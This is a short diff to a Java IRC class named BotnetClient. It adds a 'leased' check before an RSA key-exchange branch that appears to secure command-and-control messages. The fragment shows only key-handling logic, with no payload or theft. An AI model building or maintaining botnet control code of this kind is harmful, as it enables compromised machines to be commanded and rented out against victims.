@@ -284,7 +284,7 @@ public class BotnetClient extends PircBot {
 						m.handShake(otherKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
-					} else if (leasedCommandRSA.startsWith("key")) {
+					} else if (leased && leasedCommandRSA.startsWith("key")) {
 						String otherKey = leasedM.decryptRSA(chat.readLine());
 						String info = leasedM.decryptRSA(chat.readLine());
 						leasedM.setPubParams(info);
